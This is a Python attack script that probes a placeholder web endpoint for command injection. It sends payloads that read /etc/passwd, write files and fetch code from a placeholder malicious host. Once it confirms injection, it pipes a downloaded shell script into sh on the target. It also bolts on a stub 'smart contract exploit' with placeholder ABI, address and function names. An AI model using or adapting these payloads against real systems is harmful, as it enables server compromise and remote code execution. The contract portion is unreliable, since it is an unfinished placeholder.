import requests
from web3 import Web3

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Example vulnerable smart contract ABI and address
contract_abi = '[...]'  # Replace with actual ABI
contract_address = '0x...'  # Replace with actual address

# Initialize contract instance
contract = w3.eth.contract(address=contract_address, abi=contract_abi)

# Target URL and payloads
TARGET_URL = 'http://vulnerable-website.com/execute'
PAYLOADS = [
    "id; whoami",  # Command to get user ID and username
    "ls; cat /etc/passwd",  # List directory contents and view passwd file
    "echo vulnerable > /tmp/compromised.txt",  # Write to a file
    "curl http://malicious-website.com/malicious_payload"  # Download a payload
]

def send_payload(url, payload):
    try:
        response = requests.post(url, data={'command': payload})
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return None

def check_command_injection(url):
    for payload in PAYLOADS:
        response = send_payload(url, payload)
        if response and (response.text.find("vulnerable") != -1 or response.text.find("compromised") != -1):
            print(f"Command injection vulnerability found with payload: {payload}")
            return True
    return False

def perform_command_injection_attack():
    if check_command_injection(TARGET_URL):
        print("Command injection vulnerability confirmed. Executing attack...")
        # Execute a malicious payload
        malicious_payload = "curl http://malicious-website.com/malicious_payload.sh | sh"
        response = send_payload(TARGET_URL, malicious_payload)
        if response:
            print("Command injection attack executed.")
        else:
            print("Failed to execute attack.")
    else:
        print("No command injection vulnerability found.")

def exploit_smart_contract():
    try:
        # Example vulnerable function call
        tx_hash = contract.functions.executeMaliciousTransaction().transact({'from': '0xAttackerAddress'})
        receipt = w3.eth.waitForTransactionReceipt(tx_hash)
        print("Smart contract exploit successful:", receipt)
    except Exception as e:
        print(f"Error during smart contract exploit: {e}")

if __name__ == "__main__":
    perform_command_injection_attack()
    exploit_smart_contract()
